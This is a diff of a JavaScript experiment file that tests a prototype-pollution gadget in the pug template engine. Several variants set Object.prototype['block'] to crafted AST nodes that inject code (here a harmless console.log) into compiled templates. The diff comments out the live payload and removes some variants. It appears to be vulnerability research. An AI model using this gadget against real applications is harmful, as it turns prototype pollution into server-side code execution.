@@ -10,64 +10,15 @@ pug = require("pug")
 // }
 
 // exp-2
-// Object.prototype['attrs'] = []; // helper porperty to make the control flow happen
-// Object.prototype['attributeBlocks'] = []; // helper porperty to make the control flow happen
 // Object.prototype['block'] = { 
-//   type: "Block",
-//   nodes: [{
-//       type: "Tag",
-//       name: "p",
-//       block: {
-//         type: "Block",
-//         nodes: [{
-//             type: "Code",
-//             val: "console.log('code injection!!!')",
-//             block: { // this block is used to stop the infinite loop after we polluted the block property
-//               type: "Block",
-//               nodes: [{
-//                   type: "Comment",
-//                   val: "End the visiting node process"
-//                 }]
-//           }}
-//       ]}
-//     }
-// ]}
-
-// Object.prototype['attrs'] = []; // helper porperty to make the control flow happen
-// Object.prototype['attributeBlocks'] = []; // helper porperty to make the control flow happen
-// Object.prototype['block'] = { 
-//     type: "Block",
-//     nodes: [{
-//         type: "Code",
-//         val: "console.log('code injection!!!')",
-//         block: { // this block is used to stop the infinite loop after we polluted the block property
-//           type: "Block",
-//           nodes: [{
-//               type: "Comment",
-//               val: "End the visiting node process"
-//             }]
-//       }}
-//   ]}
-
-Object.prototype['block'] = { 
-    type: "Code",
-    val: "console.log('code injection!!!')",
-    block: { // this block is used to stop the infinite loop after we polluted the block property
-        type: "Comment",
-        val: "End the visiting node process"
-  }
-}
-
-
-// for node-find-undefined
-console.log("="*20+"start"+"="*20+"\n")
+//     type: "Code",
+//     val: "console.log('code injection!!!')",
+//     block: { // this block is used to stop the infinite loop after we polluted the block property
+//         type: "Comment",
+//         val: "End the visiting node process"
+//   }
+// }
 
 
 const template = pug.compile(`h1= msg`);
 console.log(template({msg: "Hello World"}));
-
-// for node-find-undefined
-console.log("="*20+"end"+"="*20+"\n")
-
-
-// console.log(template.toString());
